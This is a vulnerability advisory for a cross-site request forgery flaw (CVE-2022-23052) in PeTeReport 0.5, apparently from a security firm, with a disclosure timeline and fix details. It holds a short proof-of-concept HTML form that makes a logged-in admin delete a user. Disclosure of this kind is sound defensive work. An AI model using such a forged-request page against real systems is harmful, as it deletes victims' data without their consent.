---
slug: advisories/jett/
title: PeTeReport 0.5 - Cross-site request forgery
authors: Oscar Uribe
writer: ouribe
codename: jett
product: PeTeReport 0.5
date: 2022-02-09 12:00 COT
cveid: CVE-2022-23052
description: PeTeReport 0.5 - Cross-site request forgery
keywords: Fluid Attacks, Security, Vulnerabilities, PeTeReport
banner: advisories-bg
advise: yes
template: advisory
---

## Summary

|                         |                                                            |
|-------------------------|------------------------------------------------------------|
| **Name**                | PeTeReport 0.5 - Cross-site request forgery                |
| **Code name**           | [Jett](https://en.wikipedia.org/wiki/Joan_Jett)            |
| **Product**             | PeTeReport                                                 |
| **Affected versions**   | Version 0.5                                                |
| **Fixed versions**      | Version 0.7                                                |
| **State**               | Public                                                     |
| **Release date**        | 2022-02-23                                                 |

## Vulnerability

|                       |                                                                  |
|-----------------------|------------------------------------------------------------------|
| **Kind**              | Cross-site request forgery                                       |
| **Rule**              | [007. Cross-site request forgery](https://docs.fluidattacks.com/criteria/vulnerabilities/007)    |
| **Remote**            | Yes                                                              |
| **CVSSv3 Vector**     | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N/E:X/RL:X/RC:X       |
| **CVSSv3 Base Score** | 4.3                                                              |
| **Exploit available** | No                                                               |
| **CVE ID(s)**         | [CVE-2022-23052](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23052)                                                     |

## Description

PeteReport **Version 0.5** contains a Cross Site Request Forgery (CSRF)
vulnerability allowing an attacker to trick users into
deleting users, products, reports
and findings on the application.

## Proof of Concept

Steps to reproduce

1. Create a malicious html file with the following content.

    ```html
    <html>
    <body>
    <script>history.pushState('', '', '/')</script>
        <!--Change ID -->
        <form action="https://127.0.0.1/configuration/user/delete/:id">
        <input type="submit" value="Submit request" />
        </form>
    </body>
    </html>
    ```

2. If an authenticated admin visits the malicious url,
   the user with the correspond id will be deleted.

System Information

* Version: PeteReport Version 0.5.
* Operating System: Docker.
* Web Server: nginx.

## Exploit

There is no exploit for the vulnerability but can be manually exploited.

## Mitigation

An updated version of PeteReport is available at the vendor page.

## Credits

The vulnerability was discovered by [Oscar
Uribe](https://co.linkedin.com/in/oscar-uribe-londo%C3%B1o-0b6534155) from the Offensive
Team of  `Fluid Attacks`.

## References

|                     |                                                                     |
|---------------------|---------------------------------------------------------------------|
| **Vendor page**     | <https://github.com/1modm/petereport>                               |
| **Issue**           | <https://github.com/1modm/petereport/issues/34>                     |

## Timeline

* 2022-02-07: Vulnerability discovered.

* 2022-02-07: Vendor contacted.

* 2022-02-09: Vendor replied acknowledging the report.

* 2022-02-09: Vulnerability patched.

* 2022-02-23: Public Disclosure.